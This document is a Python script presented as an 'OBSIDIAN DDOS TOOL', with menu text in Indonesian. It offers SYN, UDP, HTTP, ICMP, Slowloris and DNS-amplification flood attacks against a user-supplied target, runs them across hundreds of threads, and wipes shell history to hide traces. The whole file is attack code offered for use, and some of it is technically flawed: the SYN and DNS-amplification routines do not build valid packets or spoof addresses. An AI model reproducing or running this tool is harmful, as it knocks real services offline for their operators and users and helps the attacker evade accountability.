#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
import os
import requests

# ========== CLEAR HISTORY ==========
os.system("clear && history -c 2>/dev/null")
os.system("rm -f ~/.bash_history ~/.python_history")

# ========== BANNER ==========
banner = """
\033[91m
╔══════════════════════════════════════════════════════════════╗
║     ██████╗ ██████╗  ██████╗ ███████╗                       ║
║    ██╔═══██╗██╔══██╗██╔════╝ ██╔════╝                       ║
║    ██║   ██║██║  ██║██║  ███╗███████╗                       ║
║    ██║   ██║██║  ██║██║   ██║╚════██║                       ║
║    ╚██████╔╝██████╔╝╚██████╔╝███████║                       ║
║     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝                       ║
║                                                              ║
║         \033[93m[ OBSIDIAN DDOS TOOL v2.0 ]\033[91m                    ║
║          \033[90mMulti-Method Network Attack Suite\033[91m             ║
╚══════════════════════════════════════════════════════════════╝
\033[0m
"""
print(banner)

# ========== MENU ==========
def menu():
    print("\033[96m[\033[93m1\033[96m] \033[97mSYN Flood\033[90m → Membuat server/network lag berat\033[0m")
    print("\033[96m[\033[93m2\033[96m] \033[97mUDP Flood\033[90m → Membanjiri port random, web server down\033[0m")
    print("\033[96m[\033[93m3\033[96m] \033[97mHTTP Flood (Layer 7)\033[90m → Menyerang aplikasi web\033[0m")
    print("\033[96m[\033[93m4\033[96m] \033[97mICMP Flood (Ping of Death)\033[90m → Membuat jaringan langsung lag\033[0m")
    print("\033[96m[\033[93m5\033[96m] \033[97mSlowloris\033[90m → Memakan koneksi server perlahan\033[0m")
    print("\033[96m[\033[93m6\033[96m] \033[97mDNS Amplification\033[90m → Memantulkan traffic\033[0m")
    print("\033[96m[\033[93m7\033[96m] \033[97mALL METHODS\033[90m → Jalankan semua sekaligus (extreme)\033[0m")
    print("\033[96m[\033[93m0\033[96m] \033[91mKeluar\033[0m")
    print("\033[90m" + "─" * 54 + "\033[0m")

# ========== SYN FLOOD ==========
def syn_flood(target_ip, target_port):
    print(f"\033[92m[✓] SYN Flood dimulai → {target_ip}:{target_port}\033[0m")
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while True:
        try:
            sock.sendto(b"SYN" * 1024, (target_ip, target_port))
        except:
            pass

# ========== UDP FLOOD ==========
def udp_flood(target_ip, target_port):
    print(f"\033[92m[✓] UDP Flood dimulai → {target_ip}:{target_port}\033[0m")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65500)
    while True:
        try:
            sock.sendto(data, (target_ip, target_port))
        except:
            pass

# ========== HTTP FLOOD ==========
def http_flood(target_url):
    print(f"\033[92m[✓] HTTP Flood dimulai → {target_url}\033[0m")
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    while True:
        try:
            requests.get(target_url, headers=headers, timeout=1)
            requests.post(target_url, data={'x': random.randint(1,9999)})
        except:
            pass

# ========== ICMP FLOOD ==========
def icmp_flood(target_ip):
    print(f"\033[92m[✓] ICMP Flood dimulai → {target_ip}\033[0m")
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x00\x00\x00' + b'PING' * 1024
    while True:
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass

# ========== SLOWLORIS ==========
def slowloris(target_ip, target_port):
    print(f"\033[92m[✓] Slowloris dimulai → {target_ip}:{target_port}\033[0m")
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            sockets.append(s)
        except:
            pass
    while True:
        for s in sockets:
            try:
                s.send(b"X-header: random\r\n")
            except:
                sockets.remove(s)
        time.sleep(10)

# ========== DNS AMPLIFICATION ==========
def dns_amp(target_ip, dns_server_list):
    print(f"\033[92m[✓] DNS Amplification dimulai → {target_ip}\033[0m")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    query = b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
    while True:
        for dns in dns_server_list:
            try:
                sock.sendto(query, (dns, 53))
            except:
                pass

# ========== MAIN ==========
while True:
    menu()
    choice = input("\n\033[93m➜\033[96m Pilih metode:\033[0m ").strip()
    
    if choice == "0":
        print("\033[91m[!] Keluar...\033[0m")
        os.system("history -c && rm ~/.bash_history")
        sys.exit()
    
    target_ip = input("\033[96mTarget IP: \033[0m").strip()
    target_port = input("\033[96mTarget Port (default 80): \033[0m").strip() or "80"
    target_port = int(target_port)
    
    threads = int(input("\033[96mJumlah thread (default 500): \033[0m").strip() or "500")
    
    print("\n\033[93m[!] Serangan dimulai! Tekan Ctrl+C untuk berhenti\033[0m\n")
    
    if choice == "1":
        for _ in range(threads):
            threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()
    elif choice == "2":
        for _ in range(threads):
            threading.Thread(target=udp_flood, args=(target_ip, target_port)).start()
    elif choice == "3":
        target_url = f"http://{target_ip}:{target_port}/"
        for _ in range(threads):
            threading.Thread(target=http_flood, args=(target_url,)).start()
    elif choice == "4":
        for _ in range(threads):
            threading.Thread(target=icmp_flood, args=(target_ip,)).start()
    elif choice == "5":
        for _ in range(threads//10):
            threading.Thread(target=slowloris, args=(target_ip, target_port)).start()
    elif choice == "6":
        dns_list = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
        threading.Thread(target=dns_amp, args=(target_ip, dns_list)).start()
    elif choice == "7":
        for _ in range(threads//4):
            threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()
            threading.Thread(target=udp_flood, args=(target_ip, target_port)).start()
            threading.Thread(target=icmp_flood, args=(target_ip,)).start()
        threading.Thread(target=http_flood, args=(f"http://{target_ip}:{target_port}/",)).start()
    else:
        print("\033[91mPilihan salah!\033[0m")
        continue
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[93m[!] Menghentikan serangan...\033[0m")
        os.system("pkill -f obsidian_ddos")
        break

os.system("history -c && rm ~/.bash_history")
print("\033[91m[+] Selesai. Jejak sudah dibersihkan.\033[0m")
